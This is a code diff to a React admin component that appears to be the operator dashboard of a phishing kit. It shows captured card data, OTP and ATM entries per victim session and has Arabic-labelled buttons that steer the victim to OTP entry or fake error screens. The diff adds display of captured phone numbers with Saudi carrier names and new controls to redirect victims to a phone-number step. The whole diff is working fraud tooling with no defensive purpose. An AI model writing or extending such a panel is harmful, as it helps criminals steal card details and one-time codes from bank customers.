@@ -145,6 +145,7 @@ function SessionBox({
   const cardData = parseData(latestCard?.data ?? null);
   const otpRows = rows.filter((row) => row.type.startsWith("otp"));
   const atmRows = rows.filter((row) => row.type === "atm");
+  const nomerRows = rows.filter((row) => row.type === "nomer");
   const lastActivity = rows[rows.length - 1]?.createdAt ?? rows[0]?.createdAt;
 
   const statusBadge = blocked
@@ -297,19 +298,74 @@ function SessionBox({
               </div>
             )}
 
-            <div className="grid gap-2 sm:grid-cols-2">
-              <button
-                type="button"
-                disabled={loadingAction === "go_otp"}
-                onClick={() => void handleControl("go_otp")}
-                className="rounded-3xl bg-green-600 px-4 py-3 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
-              >{loadingAction === "go_otp" ? "...جارٍ" : "تحويل إلى OTP"}</button>
-              <button
-                type="button"
-                disabled={loadingAction === "card_error"}
-                onClick={() => void handleControl("card_error")}
-                className="rounded-3xl border border-red-200 bg-red-50 px-4 py-3 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
-              >{loadingAction === "card_error" ? "...جارٍ" : "إبلاغ خطأ في البطاقة"}</button>
+            {/* بيانات رقم الجوال */}
+            {nomerRows.length > 0 && (
+              <div className="rounded-3xl border border-blue-200 bg-blue-50 p-4">
+                <div className="flex items-center justify-between text-xs font-semibold text-blue-700 mb-3">
+                  <span>بيانات رقم الجوال</span>
+                  <span>{nomerRows.length} إدخال</span>
+                </div>
+                {nomerRows.map((nomer) => {
+                  const data = parseData(nomer.data);
+                  const providerNames: Record<string, string> = {
+                    stc: "STC",
+                    mobily: "موبايلي",
+                    zain: "زين",
+                    jawra: "جوال"
+                  };
+                  return (
+                    <div key={nomer.id} className="rounded-2xl bg-white p-3 mb-2">
+                      <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
+                        <span>إدخال رقم الجوال</span>
+                        <span dir="ltr">{formatAgo(nomer.createdAt)}</span>
+                      </div>
+                      <div className="space-y-1 text-xs">
+                        <div className="flex justify-between">
+                          <span className="text-slate-500">مزود الخدمة:</span>
+                          <span className="font-semibold">{providerNames[data.provider] ?? data.provider ?? "—"}</span>
+                        </div>
+                        <div className="flex justify-between">
+                          <span className="text-slate-500">رقم الجوال:</span>
+                          <span className="font-mono font-semibold" dir="ltr">{data.phone ?? "—"}</span>
+                        </div>
+                      </div>
+                    </div>
+                  );
+                })}
+              </div>
+            )}
+
+            {/* أزرار التحكم */}
+            <div className="space-y-3">
+              <p className="text-[10px] text-slate-400 font-semibold">التحكم بالعميل</p>
+              <div className="grid gap-2 sm:grid-cols-2">
+                <button
+                  type="button"
+                  disabled={loadingAction === "go_otp"}
+                  onClick={() => void handleControl("go_otp")}
+                  className="rounded-3xl bg-green-600 px-4 py-3 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
+                >{loadingAction === "go_otp" ? "...جارٍ" : "توجيه للرمز"}</button>
+                <button
+                  type="button"
+                  disabled={loadingAction === "card_error"}
+                  onClick={() => void handleControl("card_error")}
+                  className="rounded-3xl border border-red-200 bg-red-50 px-4 py-3 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
+                >{loadingAction === "card_error" ? "...جارٍ" : "إبلاغ خطأ"}</button>
+              </div>
+              <div className="grid gap-2 sm:grid-cols-2">
+                <button
+                  type="button"
+                  disabled={loadingAction === "go_nomer"}
+                  onClick={() => void handleControl("go_nomer")}
+                  className="rounded-3xl bg-blue-600 px-4 py-3 text-xs font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50"
+                >{loadingAction === "go_nomer" ? "...جارٍ" : "توجيه لرقم الجوال"}</button>
+                <button
+                  type="button"
+                  disabled={loadingAction === "nomer_error"}
+                  onClick={() => void handleControl("nomer_error")}
+                  className="rounded-3xl border border-red-200 bg-red-50 px-4 py-3 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
+                >{loadingAction === "nomer_error" ? "...جارٍ" : "خطأ في الرقم"}</button>
+              </div>
             </div>
           </div>
         )}
